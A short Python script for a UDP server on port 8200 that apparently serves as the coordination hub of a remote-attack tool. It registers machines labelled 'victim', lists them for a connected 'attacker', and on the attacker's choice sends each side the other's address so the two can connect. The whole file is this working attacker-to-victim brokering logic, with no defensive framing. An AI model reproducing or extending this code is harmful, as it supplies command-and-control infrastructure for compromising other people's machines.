import socket


def send_options(victims_ips: list, s: socket.socket, ip: tuple) -> None:
    st: str = 'options'
    if not victims_ips:
        s.sendto(st.encode(), ip)
        return
    for i, ap in enumerate(victims_ips):
        st += f'{i + 1}) {ap}\n'
    s.sendto(st[:-2].encode(), ip)


def main() -> None:
    is_currently_attacking: bool = False
    socket_of_server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket_of_server.bind(("0.0.0.0", 8200))
    victims_ips: list = []
    ip_of_attacker: tuple = ()
    while 1:
        received_data_before_decoding, ip = socket_of_server.recvfrom(1024)
        received_data: str = received_data_before_decoding.decode()
        match received_data:
            case "victim":
                if ip not in victims_ips:
                    victims_ips.append(ip)
                    if not is_currently_attacking and ip_of_attacker:
                        socket_of_server.sendto(f'additional_option{len(victims_ips)}) {ip}'.encode(), ip_of_attacker)
            case "attacker":
                is_currently_attacking: bool = False
                ip_of_attacker: tuple = ip
            case "request_options":
                is_currently_attacking: bool = False
                send_options(victims_ips, socket_of_server, ip)
            case "attacker exit":
                ip_of_attacker: tuple = ()
            case "quit server":
                break
            case _:
                if received_data.startswith('choice'):
                    choice: int = int(received_data[6:])
                    if choice < len(victims_ips):
                        socket_of_server.sendto(
                            ("ip_of_victim" + str(victims_ips[choice])[1:-1].replace("'", "").replace(",",
                                                                                                      "")).encode(),
                            ip_of_attacker)
                        socket_of_server.sendto(str(ip_of_attacker)[1:-1].replace("'", "").replace(",", "").encode(),
                                                victims_ips[choice])
                        is_currently_attacking: bool = True

    socket_of_server.close()


if __name__ == '__main__':
    main()
